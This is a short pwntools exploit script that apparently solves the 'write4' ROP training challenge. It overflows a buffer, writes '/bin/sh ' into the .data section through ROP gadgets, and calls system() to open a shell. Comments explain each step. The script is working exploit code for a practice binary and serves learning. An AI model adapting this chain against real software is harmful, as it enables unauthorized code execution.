#!/usr/bin/env python2

from pwn import *

context.log_level = 'critical'
elf = ELF("./write4")

data_addr = 0x00601050 # .data section address
mov_addr = p64(0x0000000000400820) # move [r14], r15
pop_two_addr = p64(0x0000000000400890) # pop r14; pop r15; ret;
system_addr = p64(0x004005e0) # system() address
pop_rdi_addr = p64(0x0000000000400893) # pop rdi; ret;

'''
When putting the string "/bin/sh " into the register, the trailing
space is important. Otherwise a NULL byte gets placed there instead,
which can cause the exploit to not work as intended
'''

payload = "A"*40 # Overflow the buffer
payload += pop_two_addr # jump to the 'pop r14; pop r15; ret;' gadget
payload += p64(data_addr) # pop the address of the data section into r14
payload += "/bin/sh " # pop the string "/bin/sh " into r15
payload += mov_addr # jump to the 'mov [r14], r15' gadget

'''
At this stage, the data section will contain the string "/bin/sh " since
the mov instruction above just moved the string from r15 into the memory
address stored inside r14
'''

payload += pop_rdi_addr # return to the 'pop rdi; ret;' gadget from the mov instruction
payload += p64(data_addr) # store the address of the string "/bin/sh " inside rdi
payload += system_addr # return from the gadget into system
# System's return address doesn't matter

sh = elf.process()

sh.recvuntil("> ")
sh.sendline(payload)

sh.interactive()
